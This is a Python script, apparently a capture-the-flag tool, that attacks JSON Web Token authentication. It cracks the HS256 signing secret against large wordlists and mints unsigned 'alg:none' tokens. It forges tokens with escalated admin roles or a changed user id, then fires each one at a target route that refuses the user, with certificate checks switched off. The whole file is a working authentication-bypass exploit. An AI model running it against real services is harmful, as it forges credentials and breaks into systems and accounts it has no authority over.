#!/usr/bin/env python3
"""jwtquick — the whole cheap JWT attack surface in one foreground call (~1s).

Decodes the token, dictionary-cracks the HS256 secret against a JWT-specific wordlist,
mints alg:none and privilege-escalated variants, fires every candidate at a route that
currently refuses you, and scans status + headers + body for a flag.

    python jwtquick.py --token "$TOKEN" --base https://target --test /api/admin/stats

Only --token is required; without --base it just cracks and prints candidate tokens.
The default wordlist is 104k scraped JWT secrets and scans in ~0.8s, so this belongs in
the foreground at step 3. Escalate to rockyou (~39s, worth backgrounding) only if this
misses and JWT is still a live hypothesis:

    python jwtquick.py --token "$T" --base URL --test /admin --wordlist /c/Tools/hashcat-6.2.6/hashcat-6.2.6/rockyou.txt
"""
import argparse, base64, hashlib, hmac, json, os, re, sys, time

FLAG = re.compile(r"\w+\{[^}\n]{4,}\}")
# Read by Python, not by Git Bash, so a /c/... form will not resolve here.
SECLISTS = os.environ.get("SECLISTS", "C:/Tools/SecLists").replace("\\", "/")
if SECLISTS.startswith("/c/"):                      # tolerate a Git-Bash-style SECLISTS
    SECLISTS = "C:/" + SECLISTS[3:]
DEFAULT_WL = SECLISTS.rstrip("/") + "/Passwords/scraped-JWT-secrets.txt"
# claims worth flipping, and what to flip them to
PRIV = {"role": "admin", "roles": ["admin"], "isAdmin": True, "is_admin": True,
        "admin": True, "user_type": "admin", "userType": "admin", "scope": "admin",
        "permissions": ["admin"], "type": "admin", "group": "admin"}
IDC = ("id", "userId", "user_id", "sub", "uid")

def demangle(p):
    """Undo MSYS/Git-Bash argv path conversion: it rewrites a leading /api/admin/stats
    into <GitRoot>/api/admin/stats before the interpreter ever sees it."""
    exe = os.environ.get("EXEPATH")
    roots = [os.path.dirname(exe)] if exe else []
    roots += [r"C:\Program Files\Git", r"C:\Program Files (x86)\Git", r"C:\msys64"]
    norm = p.replace("\\", "/")
    for root in roots:
        r = root.replace("\\", "/").rstrip("/")
        if r and norm.lower().startswith(r.lower() + "/"):
            fixed = norm[len(r):]
            sys.stderr.write("[!] de-mangled %r -> %r\n" % (p, fixed))
            return fixed
    return norm if norm.startswith("/") else "/" + norm


b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
def b64d(s):
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

def sign(hdr, payload, secret):
    h = b64e(json.dumps(hdr, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    s = b64e(hmac.new(secret.encode(), h + b"." + p, hashlib.sha256).digest())
    return (h + b"." + p + b"." + s).decode()

def unsigned(hdr, payload, alg, sig=""):
    h = b64e(json.dumps({**hdr, "alg": alg}, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h.decode()}.{p.decode()}.{sig}"

def crack(hdr_b64, pay_b64, sig_b64, path):
    """Return the secret, or None. Compares raw digests — no re-encoding per candidate."""
    msg = (hdr_b64 + "." + pay_b64).encode()
    want = b64d(sig_b64)
    t0 = time.time()
    n = 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                cand = line.rstrip("\n\r")
                n += 1
                if hmac.compare_digest(hmac.new(cand.encode(), msg, hashlib.sha256).digest(), want):
                    print(f"[+] SECRET = {cand!r}   ({n:,} candidates, {time.time()-t0:.2f}s)")
                    return cand
    except FileNotFoundError:
        print(f"[!] wordlist not found: {path}"); return None
    print(f"[-] no hit ({n:,} candidates, {time.time()-t0:.2f}s)")
    return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", required=True)
    ap.add_argument("--base", help="target base URL; omit to only mint tokens")
    ap.add_argument("--test", default="/", help="path that currently refuses you (403/401)")
    ap.add_argument("--wordlist", default=DEFAULT_WL)
    ap.add_argument("--no-crack", action="store_true")
    a = ap.parse_args()

    parts = a.token.split(".")
    if len(parts) != 3:
        sys.exit("[!] not a 3-part JWT")
    hdr = json.loads(b64d(parts[0])); pay = json.loads(b64d(parts[1]))
    print(f"[*] header  {json.dumps(hdr)}")
    print(f"[*] payload {json.dumps(pay)}")

    secret = None if a.no_crack else crack(parts[0], parts[1], parts[2], a.wordlist)

    cands = []
    # alg:none family — free, works regardless of the secret
    for alg in ("none", "None", "NONE", "nOnE"):
        cands.append((f"alg:{alg}", unsigned(hdr, {**pay, **{k: v for k, v in PRIV.items() if k in pay}}, alg)))
    if secret:
        # escalate every privilege claim actually present; if none, inject role=admin
        esc = {**pay}
        hit = False
        for k, v in PRIV.items():
            if k in esc:
                esc[k] = v; hit = True
        if not hit:
            esc["role"] = "admin"
        cands.append(("forged:priv", sign(hdr, esc, secret)))
        for idk in IDC:
            if idk in pay:
                cands.append((f"forged:{idk}=1", sign(hdr, {**esc, idk: 1}, secret)))
                break
        cands.append(("forged:resign-only", sign(hdr, pay, secret)))

    if not a.base:
        for name, t in cands:
            print(f"\n--- {name}\n{t}")
        return

    try:
        import requests, urllib3
        urllib3.disable_warnings()
    except ImportError:
        sys.exit("[!] pip install requests")

    url = a.base.rstrip("/") + demangle(a.test)
    base_r = requests.get(url, headers={"Authorization": "Bearer " + a.token}, verify=False)
    print(f"\n[*] baseline with your own token: {base_r.status_code} ({len(base_r.content)}b)")
    print(f"[*] firing {len(cands)} candidates at {url}\n")
    for name, t in cands:
        try:
            r = requests.get(url, headers={"Authorization": "Bearer " + t}, verify=False, timeout=20)
        except Exception as e:
            print(f"  {name:22s} ERR {e}"); continue
        flags = set(FLAG.findall(r.text)) | {m for k, v in r.headers.items() for m in FLAG.findall(v)}
        win = "  <-- CHANGED" if (r.status_code != base_r.status_code or len(r.content) != len(base_r.content)) else ""
        print(f"  {name:22s} {r.status_code} ({len(r.content)}b){win}")
        for k, v in r.headers.items():
            if "flag" in k.lower():
                print(f"      HDR {k}: {v}")
        if flags:
            print(f"      FLAG {flags}")
            print(f"      TOKEN {t}")

if __name__ == "__main__":
    main()
